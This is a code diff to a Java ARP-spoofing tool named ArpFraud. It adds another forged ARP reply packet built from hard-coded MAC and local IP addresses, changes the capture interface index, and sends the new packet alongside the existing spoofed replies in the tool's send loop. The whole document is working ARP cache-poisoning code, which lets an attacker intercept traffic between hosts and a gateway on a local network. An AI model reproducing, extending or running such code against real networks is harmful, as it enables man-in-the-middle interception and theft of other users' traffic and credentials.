@@ -57,16 +57,30 @@ public class ArpFraud {
                 + ConstantUtils.Arp.OPCODE_RESPONSE.getValue()
                 + sourceMac + sourceIp + destinationMac + destinationIp;
 
+        destinationMac = "40 e2 30 df f9 ff";
+        destinationIp = "c0 a8 00 07";
+        sourceMac = "60 d8 19 2c f2 62";
+        sourceIp = "c0 a8 00 0a";
+        String responseToMe2 = destinationMac + sourceMac
+                + ConstantUtils.Ethernet.ETHER_TYPE_ARP.getValue()
+                + ConstantUtils.Arp.HARDWARE_TYPE_ETHER.getValue()
+                + ConstantUtils.Arp.UPPER_PROTOCOL_TYPE_IP.getValue()
+                + ConstantUtils.Arp.MAC_LENGTH.getValue()
+                + ConstantUtils.Arp.IP_LENGTH.getValue()
+                + ConstantUtils.Arp.OPCODE_RESPONSE.getValue()
+                + sourceMac + sourceIp + destinationMac + destinationIp;
+
         final JPacket toGatewayPacket = new JMemoryPacket(JProtocol.ETHERNET_ID, responseToGateway);
         final JPacket toHostPacket = new JMemoryPacket(JProtocol.ETHERNET_ID, responseToHost);
         final JPacket toMePacket = new JMemoryPacket(JProtocol.ETHERNET_ID, responseToMe);
+        final JPacket toMePacket2 = new JMemoryPacket(JProtocol.ETHERNET_ID, responseToMe2);
 
         System.out.println(toGatewayPacket);
         System.out.println(toHostPacket);
         System.out.println(toMePacket);
 
         PcapUtils.getAllDevs();
-        PcapUtils.index = 2;
+        PcapUtils.index = 5;
         PcapUtils.useDev();
 
         new Thread(new Runnable() {
@@ -85,6 +99,9 @@ public class ArpFraud {
                         System.out.println(PcapUtils.pcap.getErr());
                     }
                     if (PcapUtils.pcap.sendPacket(toMePacket) != Pcap.OK) {
+                        System.out.println(PcapUtils.pcap.getErr());
+                    }
+                    if (PcapUtils.pcap.sendPacket(toMePacket2) != Pcap.OK) {
                         System.out.println(PcapUtils.pcap.getErr());
                     }
                 }
